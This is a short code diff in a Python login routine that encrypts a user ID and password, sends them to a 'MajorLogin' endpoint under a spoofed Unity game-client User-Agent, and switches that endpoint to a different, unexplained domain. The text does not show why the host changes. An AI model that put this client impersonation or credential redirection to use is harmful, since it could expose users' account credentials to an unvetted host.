@@ -96,7 +96,7 @@ def process_token(uid, password):
     hex_encrypted_data = binascii.hexlify(encrypted_data).decode("utf-8")
 
     # Send the encrypted data to the server
-    url = "https://loginbp.ggblueshark.com/MajorLogin"
+    url = "https://loginbp.ppmainecoonghj.com/MajorLogin"
     headers = {
         'User-Agent': "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
         'Accept': "*/*",
